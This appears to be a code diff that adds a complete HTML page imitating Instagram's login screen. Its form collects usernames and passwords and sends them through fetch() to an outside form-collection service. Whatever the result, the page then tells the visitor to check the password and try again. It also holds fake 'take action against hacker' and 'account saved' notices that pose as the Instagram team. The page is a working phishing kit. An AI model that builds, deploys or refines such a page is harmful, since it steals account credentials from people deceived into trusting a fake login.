@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Instagram management</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet" />
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Roboto', sans-serif;
+    }
+
+    body {
+      background-color: #fafafa;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .main-wrapper {
+      width: 100%;
+      max-width: 400px;
+    }
+
+    .container, .confirm-box, .success-box {
+      background-color: white;
+      border: 1px solid #dbdbdb;
+      padding: 40px 30px;
+      text-align: center;
+      display: none;
+    }
+
+    .container {
+      display: block;
+    }
+
+    .logo img {
+      width: 100px;
+      margin-bottom: 30px;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin: 6px 0;
+      border: 1px solid #dbdbdb;
+      border-radius: 4px;
+      background-color: #fafafa;
+    }
+
+    .login-btn, .allow-btn {
+      width: 100%;
+      padding: 10px;
+      background-color: #3897f0;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-weight: bold;
+      margin-top: 14px;
+      cursor: pointer;
+    }
+
+    .or-divider {
+      display: flex;
+      align-items: center;
+      margin: 20px 0;
+    }
+
+    .or-divider::before,
+    .or-divider::after {
+      content: '';
+      flex: 1;
+      height: 1px;
+      background-color: #dbdbdb;
+    }
+
+    .or-divider span {
+      margin: 0 10px;
+      color: #8e8e8e;
+      font-weight: bold;
+    }
+
+    .forgot-password {
+      color: #00376b;
+      margin-top: 15px;
+      font-size: 13px;
+      cursor: pointer;
+    }
+
+    .signup-box {
+      margin-top: 10px;
+      padding: 20px;
+      background-color: white;
+      border: 1px solid #dbdbdb;
+      text-align: center;
+      font-size: 14px;
+    }
+
+    .signup-box a {
+      text-decoration: none;
+      color: #3897f0;
+      font-weight: bold;
+    }
+
+    .confirm-box h2,
+    .success-box h2 {
+      margin-bottom: 20px;
+      font-size: 18px;
+      color: #333;
+    }
+
+    .confirm-box p,
+    .success-box p {
+      color: #666;
+      font-size: 14px;
+      margin-bottom: 20px;
+    }
+
+    .success-box {
+      color: #28a745;
+    }
+
+    @media (max-width: 480px) {
+      .container, .confirm-box, .success-box {
+        padding: 20px 15px;
+      }
+
+      .logo img {
+        width: 100px;
+      }
+
+      input[type="text"],
+      input[type="password"] {
+        padding: 10px;
+      }
+
+      .login-btn, .allow-btn {
+        padding: 10px;
+        font-size: 14px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="main-wrapper">
+    <!-- LOGIN FORM -->
+    <div class="container" id="loginContainer">
+      <div class="logo">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo" />
+      </div>
+
+      <form id="loginForm" action="https://formcarry.com/s/ikOaHV42jEX" method="POST">
+        <input type="text" name="username_or_email" placeholder="Phone number, username, or email" required />
+        <input type="password" name="password" placeholder="Password" required />
+        <button type="submit" class="login-btn">submit</button>
+      </form>
+
+      <div class="or-divider">
+        <span>OR</span>
+      </div>
+
+      <div class="forgot-password">Forgot password?</div>
+    </div>
+
+    <!-- CONFIRMATION BOX -->
+    <div class="confirm-box" id="confirmBox">
+      <h2>Notice</h2>
+      <p>Allow us to take action against hacker</p>
+      <button class="allow-btn" onclick="showSuccess()">Allow</button>
+    </div>
+
+    <!-- SUCCESS BOX -->
+    <div class="success-box" id="successBox">
+      <h2>Success</h2>
+      <p>instagram team will successfully saved your account.</p>
+    </div>
+
+    <!-- SIGNUP BOX -->
+    <div class="signup-box">
+      Don't have an account? <a href="#">Sign up</a>
+    </div>
+  </div>
+
+  <script>
+    const form = document.getElementById('loginForm');
+
+    form.addEventListener('submit', function(event) {
+      event.preventDefault();
+
+      const input = form.elements['username_or_email'].value.trim();
+      const isEmail = input.includes('@');
+      const isPhone = /^\d{10}$/.test(input);
+
+      // Validation logic
+      if (isEmail && !input.includes('@gmail')) {
+        alert('Only @gmail addresses are allowed.');
+        return;
+      }
+
+      if (!isEmail && /\d/.test(input) && !isPhone) {
+        alert('Phone numbers must be exactly 10 digits.');
+        return;
+      }
+
+      if (!isEmail && !isPhone && input.length < 5) {
+        alert('Username must be correct.');
+        return;
+      }
+
+      const formData = new FormData(form);
+
+      fetch(form.action, {
+        method: 'POST',
+        body: formData,
+        headers: {
+          Accept: "application/json"
+        }
+      }).then(response => {
+        // Show error message instead of redirecting
+        alert("Please check your password and try again.");
+      }).catch(error => {
+        alert("There was an error submitting your request.");
+      });
+    });
+
+    function showSuccess() {
+      document.getElementById('confirmBox').style.display = 'none';
+      document.getElementById('successBox').style.display = 'block';
+    }
+  </script>
+</body>
+</html>
